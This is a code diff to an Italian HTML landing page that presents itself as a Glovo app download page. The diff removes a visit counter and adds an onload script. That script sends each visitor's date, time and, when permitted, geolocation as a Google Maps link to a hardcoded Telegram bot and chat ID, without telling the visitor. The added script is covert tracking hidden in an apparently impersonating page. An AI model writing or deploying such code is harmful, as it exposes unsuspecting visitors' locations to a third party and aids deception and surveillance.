@@ -45,11 +45,6 @@
       width: 100%;
       max-width: 300px;
     }
-    .counter {
-      margin-top: 1rem;
-      font-size: 0.9rem;
-      color: #444;
-    }
   </style>
   <script>
     function redirectToStore() {
@@ -63,18 +58,29 @@
       }
     }
 
-    // Register visit with no-cors (no JSON response expected)
+    // Invia messaggio Telegram con data, ora e (se possibile) posizione
     window.onload = function() {
-      fetch("https://script.google.com/macros/s/AKfycbyWBst-FTUD_LBi1A3kA1P9vZMrB8JxNLeBJq9OMjoSUTJedMpvmzZ7g6WOLtQk8sBaXg/exec", {
-        mode: 'no-cors'
-      })
-      .then(() => {
-        document.getElementById("counter").innerText = "Grazie per la visita!";
-      })
-      .catch(err => {
-        console.error("Errore fetch:", err);
-        document.getElementById("counter").innerText = "Errore nel conteggio.";
-      });
+      const now = new Date();
+      const dateTime = now.toLocaleString();
+
+      const sendMessage = (locationText = '') => {
+        const message = `👀 Qualcuno ha aperto la pagina Glovo!\n🕒 Data/Ora: ${dateTime}${locationText}`;
+        fetch(`https://api.telegram.org/bot7772790004:AAFPul63mfCY8NIfH5Sju0r7b36_QuEJBAA/sendMessage?chat_id=5886300958&text=${encodeURIComponent(message)}`);
+      };
+
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            const lat = position.coords.latitude.toFixed(5);
+            const lon = position.coords.longitude.toFixed(5);
+            const locationText = `\n📍 Posizione approssimativa: https://www.google.com/maps?q=${lat},${lon}`;
+            sendMessage(locationText);
+          },
+          () => sendMessage() // in caso di rifiuto geolocalizzazione
+        );
+      } else {
+        sendMessage();
+      }
     };
   </script>
 </head>
@@ -83,7 +89,6 @@
     <img src="Glovo_Logo.png" alt="Glovo Logo" class="logo">
     <p class="slogan">Tu ordina, ci andiamo noi.</p>
     <button class="download-button" onclick="redirectToStore()">Scarica l'app</button>
-    <div class="counter" id="counter"></div>
   </div>
 </body>
 </html>
